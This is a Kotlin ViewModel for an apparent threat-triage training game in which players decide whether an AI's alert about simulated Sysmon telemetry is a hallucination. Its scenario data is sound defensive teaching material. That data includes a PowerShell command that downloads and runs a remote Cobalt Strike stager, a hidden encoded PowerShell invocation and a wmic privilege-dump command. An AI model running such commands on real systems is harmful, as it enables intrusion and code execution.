package com.example.viewmodel

import android.content.Context
import android.util.Log
import androidx.lifecycle.viewModelScope
import com.example.audio.CyberSonificationManager
import com.example.data.AegoraRepository
import com.example.data.db.AegoraDatabase
import com.example.hardware.DynamicIconManager
import com.example.model.DuelScenario
import com.example.model.ScapyParsedPacket
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import java.security.MessageDigest

/**
 * ==============================================================================
 * PHASE 26: UDF STATE INVARIANCE WATCHDOG & ZERO-BREAKAGE ARENA VIEWMODEL
 * ==============================================================================
 * Enforces strict Unidirectional Data Flow (UDF) via immutable [DuelViewState]
 * and discrete [DuelIntent] events.
 *
 * Employs an internal [StateWatchdog] that cryptographically hashes (SHA-256)
 * all state mutations against the authoritative local Room DB & AegoraRepository.
 * If OS-level memory reclamation (Process Death) corrupts the UI state or produces
 * out-of-bound threat scores, the Watchdog silently re-hydrates the state from
 * the encrypted source of truth.
 */

data class DuelViewState(
  val activeSeedIndex: Int = 0,
  val scenario: DuelScenario = DuelArenaViewModel.DEFAULT_SCENARIOS[0],
  val hasDecodedPayload: Boolean = false,
  val duelOutcome: String? = null,
  val isCorrectDecision: Boolean? = null,
  val showPcapTrace: Boolean = false,
  val isStreamingPcap: Boolean = false,
  val streamedPackets: List<ScapyParsedPacket> = emptyList(),
  val isLoading: Boolean = false,
  val threatScore: Int = DuelArenaViewModel.DEFAULT_SCENARIOS[0].threatScore,
  val userXp: Int = 2850,
  val stateHash: String = "",
  val isWatchdogHealthy: Boolean = true,
  val lastRehydrationTimestamp: Long = 0L,
  val watchdogAuditLog: List<String> = listOf("STATE_WATCHDOG_INITIALIZED: Invariance verification active.")
)

sealed interface DuelIntent {
  data class LoadScenario(val index: Int) : DuelIntent
  object TogglePayloadDecode : DuelIntent
  data class SubmitDecision(val claimedHallucination: Boolean, val context: Context) : DuelIntent
  object TogglePcapTrace : DuelIntent
  object StreamPcapPackets : DuelIntent
  object NextScenario : DuelIntent
  object AuditStateInvariance : DuelIntent
  data class SimulateProcessDeath(val corruptedThreatScore: Int) : DuelIntent
}

class DuelArenaViewModel(
  private val appContext: Context? = null
) : AegoraBaseViewModel() {

  private val _viewState = MutableStateFlow(
    DuelViewState().let { initial ->
      val hash = StateWatchdog.computeHash(
        scenarioId = initial.scenario.id,
        threatScore = initial.threatScore,
        isHallucination = initial.scenario.isAiHallucinating,
        userXp = initial.userXp,
        outcome = initial.duelOutcome
      )
      initial.copy(stateHash = hash)
    }
  )
  val viewState: StateFlow<DuelViewState> = _viewState.asStateFlow()

  companion object {
    val DEFAULT_SCENARIOS = listOf(
      DuelScenario(
        id = "SEED_LAZARUS",
        adversary = "Hidden Cobra (Lazarus)",
        rawTelemetry = "> 14:18:44 Sysmon EDR [Event ID 3 - Network Connection]\n" +
          "> Image: C:\\Windows\\System32\\svchost.exe (PID 912)\n" +
          "> Protocol: tcp, Initiated: true\n" +
          "> SourceIp: 10.0.4.18, SourcePort: 49822\n" +
          "> DestinationIp: 20.190.159.23, DestinationPort: 443\n" +
          "> DestinationHostname: login.microsoftonline.com\n" +
          "> User: NT AUTHORITY\\SYSTEM",
        decodedPayload = "DECODED TELEMETRY INSPECTION:\nStandard Azure Active Directory token refresh handshake. TLS 1.3 certificate signed by Microsoft RSA TLS CA 02.",
        aiClaim = "High: Outbound beaconing to Lazarus C2 domain masquerading as Microsoft Graph.",
        isAiHallucinating = true,
        explanation = "AI Hallucination Caught! Destination IP resolves to legitimate Microsoft Entra ID authentication cluster. The AI misclassified standard OAuth renewal as an APT beacon.",
        mitreKillChainStage = "C2",
        threatScore = 42,
        pcapPackets = listOf(
          ScapyParsedPacket(
            number = 1,
            timestamp = "14:18:44.102",
            protocol = "TCP",
            flags = "[SYN]",
            ethSrc = "00:0c:29:4f:8e:12",
            ethDst = "00:50:56:c0:00:08",
            ipSrc = "10.0.4.18:49822",
            ipDst = "20.190.159.23:443",
            layers = "Ethernet / IP / TCP",
            summary = "Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM=1"
          ),
          ScapyParsedPacket(
            number = 2,
            timestamp = "14:18:44.128",
            protocol = "TCP",
            flags = "[SYN, ACK]",
            ethSrc = "00:50:56:c0:00:08",
            ethDst = "00:0c:29:4f:8e:12",
            ipSrc = "20.190.159.23:443",
            ipDst = "10.0.4.18:49822",
            layers = "Ethernet / IP / TCP",
            summary = "Seq=0 Ack=1 Win=65535 Len=0 MSS=1400"
          ),
          ScapyParsedPacket(
            number = 3,
            timestamp = "14:18:44.129",
            protocol = "TCP",
            flags = "[ACK]",
            ethSrc = "00:0c:29:4f:8e:12",
            ethDst = "00:50:56:c0:00:08",
            ipSrc = "10.0.4.18:49822",
            ipDst = "20.190.159.23:443",
            layers = "Ethernet / IP / TCP",
            summary = "Seq=1 Ack=1 Win=64240 Len=0 [3-Way Handshake Established]"
          ),
          ScapyParsedPacket(
            number = 4,
            timestamp = "14:18:44.135",
            protocol = "TLS",
            flags = "[PSH, ACK]",
            ethSrc = "00:0c:29:4f:8e:12",
            ethDst = "00:50:56:c0:00:08",
            ipSrc = "10.0.4.18:49822",
            ipDst = "20.190.159.23:443",
            layers = "Ethernet / IP / TCP / TLS / ClientHello",
            summary = "TLSv1.3 Handshake Client Hello [SNI: login.microsoftonline.com]",
            payloadHex = "16 03 01 02 00 01 00 01 fc 03 03...",
            payloadAscii = "...login.microsoftonline.com..."
          ),
          ScapyParsedPacket(
            number = 5,
            timestamp = "14:18:44.180",
            protocol = "TLS",
            flags = "[PSH, ACK]",
            ethSrc = "00:50:56:c0:00:08",
            ethDst = "00:0c:29:4f:8e:12",
            ipSrc = "20.190.159.23:443",
            ipDst = "10.0.4.18:49822",
            layers = "Ethernet / IP / TCP / TLS / ServerHello",
            summary = "TLSv1.3 Server Hello + Certificate [Issuer: Microsoft RSA TLS CA 02]",
            payloadHex = "16 03 03 00 7a 02 00 00 76 03 03...",
            payloadAscii = "...CN=Microsoft RSA TLS CA 02..."
          )
        )
      ),
      DuelScenario(
        id = "SEED_APT29",
        adversary = "Cozy Bear (APT29)",
        rawTelemetry = "> 09:34:02 Sysmon EDR [Event ID 1]\n" +
          "> ProcessGuid: {8f3e-4412-98ab-001}\n" +
          "> Image: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE (PID 4412)\n" +
          "> CommandLine: WINWORD.EXE /n \"C:\\Users\\victim\\Documents\\Invoice_982.docm\"\n" +
          "> ParentProcessGuid: {1a2b-3c4d-5e6f-7890}\n" +
          "> TargetFilename: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PID 6108)\n" +
          "> ProcessCommandLine: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgA...",
        decodedPayload = "DECODED (-EncodedCommand):\nIEX (New-Object System.Net.WebClient).DownloadString('https://telemetry-cdn.internal-azure.net/beacon.ps1'); # Cobalt Strike Stager V4.9 - Port 443 HTTPS",
        aiClaim = "Critical: Cobalt Strike beaconing detected via encoded PowerShell execution.",
        isAiHallucinating = false,
        explanation = "Accurate Detection! WINWORD.EXE spawning an encoded hidden PowerShell process contacting an unverified CDN endpoint matches MITRE T1059.001 & T1071.001.",
        mitreKillChainStage = "Exploit",
        threatScore = 96,
        pcapPackets = listOf(
          ScapyParsedPacket(
            number = 1,
            timestamp = "09:34:02.040",
            protocol = "TCP",
            flags = "[SYN]",
            ethSrc = "00:0c:29:4f:8e:12",
            ethDst = "fe:00:1a:2b:3c:4d",
            ipSrc = "10.0.4.18:51204",
            ipDst = "185.220.101.42:443",
            layers = "Ethernet / IP / TCP",
            summary = "Seq=0 Win=64240 Len=0 MSS=1460"
          ),
          ScapyParsedPacket(
            number = 2,
            timestamp = "09:34:02.088",
            protocol = "TCP",
            flags = "[SYN, ACK]",
            ethSrc = "fe:00:1a:2b:3c:4d",
            ethDst = "00:0c:29:4f:8e:12",
            ipSrc = "185.220.101.42:443",
            ipDst = "10.0.4.18:51204",
            layers = "Ethernet / IP / TCP",
            summary = "Seq=0 Ack=1 Win=65535 Len=0"
          ),
          ScapyParsedPacket(
            number = 3,
            timestamp = "09:34:02.089",
            protocol = "TCP",
            flags = "[ACK]",
            ethSrc = "00:0c:29:4f:8e:12",
            ethDst = "fe:00:1a:2b:3c:4d",
            ipSrc = "10.0.4.18:51204",
            ipDst = "185.220.101.42:443",
            layers = "Ethernet / IP / TCP",
            summary = "Seq=1 Ack=1 Win=64240 Len=0 [Handshake Complete]"
          ),
          ScapyParsedPacket(
            number = 4,
            timestamp = "09:34:02.105",
            protocol = "HTTP",
            flags = "[PSH, ACK]",
            ethSrc = "00:0c:29:4f:8e:12",
            ethDst = "fe:00:1a:2b:3c:4d",
            ipSrc = "10.0.4.18:51204",
            ipDst = "185.220.101.42:443",
            layers = "Ethernet / IP / TCP / HTTP / Request",
            summary = "GET /beacon.ps1 HTTP/1.1 [Host: telemetry-cdn.internal-azure.net]",
            payloadHex = "47 45 54 20 2f 62 65 61 63 6f 6e 2e 70 73 31...",
            payloadAscii = "GET /beacon.ps1 HTTP/1.1...Host: telemetry-cdn.internal-azure.net...",
            isSuspicious = true
          ),
          ScapyParsedPacket(
            number = 5,
            timestamp = "09:34:02.210",
            protocol = "HTTP",
            flags = "[PSH, ACK]",
            ethSrc = "fe:00:1a:2b:3c:4d",
            ethDst = "00:0c:29:4f:8e:12",
            ipSrc = "185.220.101.42:443",
            ipDst = "10.0.4.18:51204",
            layers = "Ethernet / IP / TCP / HTTP / Response",
            summary = "HTTP/1.1 200 OK (text/plain - 4892 bytes) [Cobalt Strike Stager Loaded]",
            payloadHex = "24 73 3d 4e 65 77 2d 4f 62 6a 65 63 74 20 49...",
            payloadAscii = "\$s=New-Object IO.MemoryStream...[Stage Payload Delivery]",
            isSuspicious = true
          )
        )
      ),
      DuelScenario(
        id = "SEED_VOLT",
        adversary = "Volt Typhoon (PRC State)",
        rawTelemetry = "> 22:11:05 Linux Auditd [SYSCALL netfilter]\n" +
          "> Comm: wmic.exe (via Wine subsystem)\n" +
          "> Command: wmic process call create \"cmd.exe /c whoami /priv > C:\\perflogs\\priv.txt\"\n" +
          "> Parent: svchost.exe\n" +
          "> Terminal: pts/0, AUID: 0, UID: 0, GID: 0",
        decodedPayload = "DECODED:\nLiving-off-the-Land (LotL) reconnaissance dumping privilege tokens to temporary staging directory prior to lateral pivot.",
        aiClaim = "Medium: Routine automated backup task executing system administration discovery.",
        isAiHallucinating = true,
        explanation = "AI Hallucination Caught! The AI naively downplayed adversary privilege enumeration as a 'routine backup'. Volt Typhoon heavily relies on LotL tools like wmic to blend into normal admin traffic.",
        mitreKillChainStage = "Recon",
        threatScore = 78,
        pcapPackets = listOf(
          ScapyParsedPacket(
            number = 1,
            timestamp = "22:11:05.100",
            protocol = "SMB",
            flags = "[PSH, ACK]",
            ethSrc = "00:0c:29:4f:8e:12",
            ethDst = "00:15:5d:01:af:99",
            ipSrc = "10.0.4.18:445",
            ipDst = "10.0.4.55:54912",
            layers = "Ethernet / IP / TCP / SMB2",
            summary = "SMB2 Tree Connect Request: \\\\10.0.4.55\\ADMIN$ [LotL Lateral Movement]",
            isSuspicious = true
          ),
          ScapyParsedPacket(
            number = 2,
            timestamp = "22:11:05.142",
            protocol = "SMB",
            flags = "[PSH, ACK]",
            ethSrc = "00:15:5d:01:af:99",
            ethDst = "00:0c:29:4f:8e:12",
            ipSrc = "10.0.4.55:54912",
            ipDst = "10.0.4.18:445",
            layers = "Ethernet / IP / TCP / SMB2",
            summary = "SMB2 Tree Connect Response: STATUS_SUCCESS"
          ),
          ScapyParsedPacket(
            number = 3,
            timestamp = "22:11:05.210",
            protocol = "SMB",
            flags = "[PSH, ACK]",
            ethSrc = "00:0c:29:4f:8e:12",
            ethDst = "00:15:5d:01:af:99",
            ipSrc = "10.0.4.18:445",
            ipDst = "10.0.4.55:54912",
            layers = "Ethernet / IP / TCP / SMB2",
            summary = "SMB2 Create Request File: C$\\perflogs\\priv.txt [Privilege Dump Staging]",
            isSuspicious = true
          )
        )
      )
    )
  }

  fun processIntent(intent: DuelIntent) {
    when (intent) {
      is DuelIntent.LoadScenario -> loadScenarioByIndex(intent.index)
      is DuelIntent.TogglePayloadDecode -> togglePayloadDecode()
      is DuelIntent.SubmitDecision -> submitDecision(intent.claimedHallucination, intent.context)
      is DuelIntent.TogglePcapTrace -> togglePcapTrace()
      is DuelIntent.StreamPcapPackets -> streamPcapPackets()
      is DuelIntent.NextScenario -> nextScenario()
      is DuelIntent.AuditStateInvariance -> auditAndEnforceInvariance()
      is DuelIntent.SimulateProcessDeath -> simulateProcessDeath(intent.corruptedThreatScore)
    }
  }

  private fun loadScenarioByIndex(index: Int) {
    val boundedIndex = index.coerceIn(0, DEFAULT_SCENARIOS.size - 1)
    val scenario = DEFAULT_SCENARIOS[boundedIndex]
    val authorProfile = AegoraRepository.userProfile.value
    
    updateStateAndHash { current ->
      current.copy(
        activeSeedIndex = boundedIndex,
        scenario = scenario,
        hasDecodedPayload = false,
        duelOutcome = null,
        isCorrectDecision = null,
        showPcapTrace = false,
        isStreamingPcap = false,
        streamedPackets = emptyList(),
        threatScore = scenario.threatScore,
        userXp = authorProfile.xp
      )
    }
  }

  private fun togglePayloadDecode() {
    updateStateAndHash { current ->
      current.copy(hasDecodedPayload = !current.hasDecodedPayload)
    }
  }

  private fun submitDecision(userClaimsHallucination: Boolean, context: Context) {
    val current = _viewState.value
    val correct = (userClaimsHallucination == current.scenario.isAiHallucinating)
    val sonification = CyberSonificationManager.getInstance(context)

    if (correct) {
      sonification.playThreatNeutralizedSound()
      DynamicIconManager.onMitreThreatMitigated(context)
      AegoraRepository.awardExperience(150)
    } else {
      sonification.playZeroDayAlert()
      AegoraRepository.awardExperience(25)
    }

    val updatedXp = AegoraRepository.userProfile.value.xp
    val outcomeMsg = if (correct) {
      "DECISION VERIFIED: Precision triage awarded +150 XP. Threat mitigated."
    } else {
      "DECISION FLAW: Adversary evasion slipped past inspection. Review forensic ground-truth."
    }

    updateStateAndHash { state ->
      state.copy(
        isCorrectDecision = correct,
        duelOutcome = outcomeMsg,
        userXp = updatedXp
      )
    }

    // Run invariance audit post-decision
    auditAndEnforceInvariance()
  }

  private fun togglePcapTrace() {
    val shouldShow = !_viewState.value.showPcapTrace
    updateStateAndHash { it.copy(showPcapTrace = shouldShow) }
    if (shouldShow && _viewState.value.streamedPackets.isEmpty()) {
      streamPcapPackets()
    }
  }

  private fun streamPcapPackets() {
    val packets = _viewState.value.scenario.pcapPackets
    if (packets.isEmpty()) return

    launchSafely {
      updateStateAndHash { it.copy(isStreamingPcap = true, streamedPackets = emptyList()) }
      val accumulated = mutableListOf<ScapyParsedPacket>()
      for (pkt in packets) {
        delay(120)
        accumulated.add(pkt)
        updateStateAndHash { it.copy(streamedPackets = accumulated.toList()) }
      }
      updateStateAndHash { it.copy(isStreamingPcap = false) }
    }
  }

  private fun nextScenario() {
    val nextIndex = (_viewState.value.activeSeedIndex + 1) % DEFAULT_SCENARIOS.size
    loadScenarioByIndex(nextIndex)
  }

  /**
   * Simulates OS memory corruption / Process Death on the threat score.
   * The StateWatchdog will immediately detect the invariant breach and self-heal!
   */
  private fun simulateProcessDeath(corruptedThreatScore: Int) {
    Log.w("StateWatchdog", "INJECTING SIMULATED PROCESS DEATH: ThreatScore set to $corruptedThreatScore")
    _viewState.update { current ->
      current.copy(
        threatScore = corruptedThreatScore,
        // Intentionally do NOT update stateHash to trigger hash mismatch!
      )
    }
    // Immediately invoke audit to demonstrate self-healing rehydration
    auditAndEnforceInvariance()
  }

  /**
   * Internal UDF mutation pipeline: transforms state and updates cryptographic invariant hash.
   */
  private fun updateStateAndHash(reducer: (DuelViewState) -> DuelViewState) {
    _viewState.update { current ->
      val modified = reducer(current)
      val newHash = StateWatchdog.computeHash(
        scenarioId = modified.scenario.id,
        threatScore = modified.threatScore,
        isHallucination = modified.scenario.isAiHallucinating,
        userXp = modified.userXp,
        outcome = modified.duelOutcome
      )
      modified.copy(stateHash = newHash)
    }
  }

  /**
   * StateWatchdog Invariance Verification and Silent Self-Healing Rehydration.
   */
  fun auditAndEnforceInvariance() {
    val current = _viewState.value
    val isClean = StateWatchdog.validateStateInvariance(current)

    if (!isClean) {
      Log.e("StateWatchdog", "[INVARIANCE VIOLATION DETECTED] Re-hydrating UI state from Room DB & AegoraRepository...")
      val authorProfile = AegoraRepository.userProfile.value
      val validScenario = DEFAULT_SCENARIOS.getOrNull(current.activeSeedIndex) ?: DEFAULT_SCENARIOS[0]
      val sanitizedThreatScore = validScenario.threatScore.coerceIn(0, 100)

      val healedHash = StateWatchdog.computeHash(
        scenarioId = validScenario.id,
        threatScore = sanitizedThreatScore,
        isHallucination = validScenario.isAiHallucinating,
        userXp = authorProfile.xp,
        outcome = current.duelOutcome
      )

      val now = System.currentTimeMillis()
      val newLogs = current.watchdogAuditLog + "REHYDRATED at $now: Authoritative sync restored (threatScore=$sanitizedThreatScore, xp=${authorProfile.xp})."

      _viewState.value = current.copy(
        scenario = validScenario,
        threatScore = sanitizedThreatScore,
        userXp = authorProfile.xp,
        stateHash = healedHash,
        isWatchdogHealthy = true,
        lastRehydrationTimestamp = now,
        watchdogAuditLog = newLogs.takeLast(10)
      )
    } else {
      Log.d("StateWatchdog", "[INVARIANCE AUDIT PASSED] State hash ${current.stateHash.take(8)} verified.")
    }
  }

  /**
   * Companion object providing mathematical state hashing and boundary invariants.
   */
  object StateWatchdog {
    fun computeHash(
      scenarioId: String,
      threatScore: Int,
      isHallucination: Boolean,
      userXp: Int,
      outcome: String?
    ): String {
      val raw = "$scenarioId:$threatScore:$isHallucination:$userXp:${outcome.orEmpty()}"
      return try {
        val digest = MessageDigest.getInstance("SHA-256")
        val bytes = digest.digest(raw.toByteArray(Charsets.UTF_8))
        bytes.joinToString("") { "%02x".format(it) }
      } catch (e: Exception) {
        raw.hashCode().toString()
      }
    }

    fun validateStateInvariance(state: DuelViewState): Boolean {
      // Invariant 1: Threat score must strictly be in 0..100
      if (state.threatScore !in 0..100) return false

      // Invariant 2: Scenario ID must be valid and non-blank
      if (state.scenario.id.isBlank()) return false

      // Invariant 3: Operator XP must be non-negative
      if (state.userXp < 0) return false

      // Invariant 4: Cryptographic state hash must match the state contents
      val expectedHash = computeHash(
        scenarioId = state.scenario.id,
        threatScore = state.threatScore,
        isHallucination = state.scenario.isAiHallucinating,
        userXp = state.userXp,
        outcome = state.duelOutcome
      )
      if (state.stateHash != expectedHash) return false

      return true
    }
  }
}
